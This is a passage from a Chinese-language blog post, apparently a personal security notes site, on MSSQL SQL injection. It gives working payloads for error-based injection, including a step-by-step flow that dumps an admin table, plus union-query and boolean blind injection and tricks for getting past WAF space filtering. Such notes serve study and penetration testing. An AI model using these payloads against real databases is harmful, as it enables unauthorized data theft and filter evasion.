class="number">100</span>   <span class="keyword">NULL</span>                <span class="keyword">NULL</span>                      <span class="keyword">NULL</span>            <span class="keyword">NULL</span>                 <span class="keyword">NULL</span>                    <span class="keyword">NULL</span>                   iso_1                <span class="keyword">NULL</span>                <span class="keyword">NULL</span>               SQL_Latin1_General_CP1_CI_AS   <span class="keyword">NULL</span>             <span class="keyword">NULL</span>            <span class="keyword">NULL</span></span><br><span class="line"> test            dbo            test1        age                          <span class="number">3</span>   <span class="keyword">NULL</span>             YES           <span class="type">int</span>         <span class="keyword">NULL</span>                       <span class="keyword">NULL</span>                                    <span class="number">10</span>                        <span class="number">10</span>               <span class="number">0</span>   <span class="keyword">NULL</span>                 <span class="keyword">NULL</span>                    <span class="keyword">NULL</span>                   <span class="keyword">NULL</span>                 <span class="keyword">NULL</span>                <span class="keyword">NULL</span>               <span class="keyword">NULL</span>                           <span class="keyword">NULL</span>             <span class="keyword">NULL</span>            <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="报错方法"><a href="#报错方法" class="headerlink" title="报错方法"></a>报错方法</h4><p>mssql中没有报错函数，其报错注入利用显式或隐式的类型转换来报错,所以只要能够导致类型转换错误的函数/方法都可以用来进行爆错注入 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">&lt;</span><span class="keyword">user</span>; <span class="comment">--</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> (<span class="keyword">select</span> <span class="built_in">CAST</span>(<span class="keyword">user</span> <span class="keyword">as</span> <span class="type">int</span>))</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> (<span class="keyword">select</span> <span class="keyword">convert</span>(<span class="type">int</span>,<span class="keyword">user</span>))</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> (<span class="keyword">select</span> db_name(<span class="keyword">user</span>))</span><br><span class="line"><span class="comment">--还有：col_name(1,user)，filegroup_name(user)，object_name(user)，suser_name(user)等</span></span><br></pre></td></tr></table></figure>
+<h4 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Fanmv_Admin <span class="keyword">WHERE</span> AdminID<span class="operator">=</span>？</span><br><span class="line"><span class="comment">--获取当前据库名</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> DB_NAME()<span class="operator">&gt;</span><span class="number">1</span>;</span><br><span class="line"><span class="comment">--获取所有数据库名,FOR XML PATh将多个行的数据合并为一个xml格式的字符串</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> name <span class="keyword">from</span> master..sysdatabases <span class="keyword">for</span> xml path)</span><br><span class="line"><span class="comment">--获取表名</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">SELECT</span> TOP <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">WHERE</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="operator">!=</span><span class="string">&#x27;shipinsjc&#x27;</span>);</span><br><span class="line"><span class="comment">--获取字段</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;Fanmv_Admin&#x27;</span>)  <span class="keyword">AND</span> name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ChapterInfo&#x27;</span>) );</span><br><span class="line"><span class="comment">--获取数据，CAST() 用于将一个数据类型转换为另一个数据类型。例如，将 INT 类型转换为 VARCHAR</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">SELECT</span> TOP <span class="number">1</span> <span class="built_in">CAST</span>(id <span class="keyword">AS</span> <span class="type">VARCHAR</span>)<span class="operator">+</span><span class="string">&#x27;|&#x27;</span><span class="operator">+</span>mc<span class="operator">+</span><span class="string">&#x27;|&#x27;</span><span class="operator">+</span><span class="built_in">CAST</span>(shijianchang <span class="keyword">AS</span> <span class="type">VARCHAR</span>) <span class="keyword">from</span> Fanmv_Admin);</span><br></pre></td></tr></table></figure>
+
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>mssql不用数字占位，因为可能会发生隐式转换，用null来占位</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>; <span class="comment">--查看列数</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test1 <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">user</span>,<span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">109</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span>  <span class="keyword">from</span> article <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>iif(<span class="keyword">LEFT</span>(db_name(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;t&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF 绕过"></a>WAF 绕过</h2><h3 id="绕空格"><a href="#绕空格" class="headerlink" title="绕空格"></a>绕空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x01到0x20	</span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>
+<p>除此之外还有几处特殊的绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>[test1] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="keyword">null</span>,<span class="number">50</span> from.test2; </span><br><span class="line"><span class="comment">--[]和.可以绕过from处空格,当union前为数字时可以省略空格</span></span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/SQL/"># SQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/04/21/java/Serializable/JDBC%20%E5%88%A9%E7%94%A8/">JDBC 利用</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
